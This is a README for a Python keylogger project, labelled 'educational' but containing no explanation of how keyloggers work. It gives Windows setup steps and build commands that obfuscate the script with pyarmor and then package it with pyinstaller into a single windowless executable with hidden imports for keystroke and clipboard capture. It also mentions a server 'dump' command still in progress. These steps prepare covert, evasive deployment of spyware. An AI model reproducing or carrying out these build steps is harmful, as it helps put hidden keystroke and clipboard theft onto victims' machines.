# 111keylogger
A basic guide to how keyloggers work.

Server "dump" command work in progress. This project is to be continued.

# PLEASE NOTE:
This content is for educational purposes only, to educate you how a basic keylogger works. I will not be responsible for how you will use this.

# Installation
Windows 10
```
python -m venv venv
venv\Scripts\activate
pip install -r requirements.txt
```

# Convert to EXE
First do the installation and then run this command.
```
pyarmor gen 111keylogger.py
cd ./dist
pyinstaller 111keylogger.py --onefile --clean --icon NONE --noconsole --hidden-import win32gui --hidden-import pynput --hidden-import win32clipboard
```

Literally fuck everything.
